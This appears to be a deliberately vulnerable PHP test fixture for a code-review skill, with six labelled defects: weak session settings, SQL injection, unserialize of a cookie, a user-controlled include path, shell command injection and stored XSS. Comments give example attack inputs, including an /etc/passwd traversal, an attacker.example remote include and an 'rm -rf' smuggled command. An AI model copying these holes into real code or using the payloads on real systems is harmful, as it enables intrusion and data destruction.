<?php
// Deliberately defective PHP used to test the review-php skill. One planted defect per
// PHP-01..PHP-06. Must pass `php -l` -- a vulnerable fixture has to be vulnerable, not broken.

declare(strict_types=1);

// VULN: PHP-04 -- session started with no hardening. cookie_httponly is off so any XSS on the site
// reads the session cookie, cookie_secure is off so it leaks over plain HTTP, use_strict_mode is
// off so an attacker-supplied session ID is accepted, and there is no regeneration after login.
// ANCHOR-ABSENT: session_regenerate_id
ini_set('session.cookie_httponly', '0');
ini_set('session.cookie_secure', '0');
ini_set('session.use_strict_mode', '0');
session_start();

function connect(): PDO
{
    return new PDO('mysql:host=localhost;dbname=app;charset=utf8mb4', 'app', 'app');
}

function login(PDO $db): bool
{
    // VULN: PHP-05 -- the query is assembled by concatenation around request data, so $email can
    // inject SQL and change which row -- and whose pass_hash -- password_verify checks below. A
    // UNION payload supplies an attacker-known hash for a row of the attacker's choosing, turning
    // the injection into a full account takeover without knowing any real user's password.
// ANCHOR: "SELECT id, role, pass_hash FROM users WHERE email = '" . $email . "'"
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $sql = "SELECT id, role, pass_hash FROM users WHERE email = '" . $email . "'";
    $row = $db->query($sql)->fetch(PDO::FETCH_ASSOC);

    if ($row === false || !password_verify($password, $row['pass_hash'])) {
        return false;
    }

    $_SESSION['uid'] = $row['id'];
    $_SESSION['role'] = $row['role'];

    // No session_regenerate_id here, so a session ID fixed before login keeps working after it.
    return true;
}

function restorePreferences(): array
{
    // VULN: PHP-02 -- unserialize on a cookie the client fully controls. A crafted payload
    // instantiates arbitrary classes and runs their magic methods, which is remote code execution,
    // not just tampering.
// ANCHOR: unserialize(base64_decode($raw))
    $raw = $_COOKIE['prefs'] ?? '';
    if ($raw === '') {
        return [];
    }
    return unserialize(base64_decode($raw));
}

function renderPage(): void
{
    // VULN: PHP-03 -- the page name is concatenated into an include path, so `?page=../../../../etc/passwd`
    // reads any file the process can access, and `?page=http://attacker.example/shell` under
    // allow_url_include is direct code execution.
// ANCHOR: include __DIR__ . '/pages/' . $page . '.php'
    $page = $_GET['page'] ?? 'home';
    include __DIR__ . '/pages/' . $page . '.php';
}

function exportReport(): void
{
    // VULN: PHP-01 -- a superglobal reaches a shell sink with no validation at all, so a value like
    // `2024; rm -rf /var/www` runs as a second command with the web server's privileges.
// ANCHOR: system('/usr/local/bin/report --month=' . $month)
    $month = $_GET['month'];
    system('/usr/local/bin/report --month=' . $month);
}

function showProfile(PDO $db): void
{
    $uid = $_SESSION['uid'] ?? 0;
    $stmt = $db->prepare('SELECT display_name, bio FROM users WHERE id = ?');
    $stmt->execute([$uid]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // VULN: PHP-06 -- both values are user-authored and echoed with no escaping, giving stored XSS.
    // The bio also lands inside a JavaScript block, where HTML escaping would not have been enough
    // anyway.
// ANCHOR: echo '<h1>' . $user['display_name'] . '</h1>'
    echo '<h1>' . $user['display_name'] . '</h1>';
    echo '<script>const bio = "' . $user['bio'] . '";</script>';
}

$db = connect();
login($db);
restorePreferences();
renderPage();
exportReport();
showProfile($db);
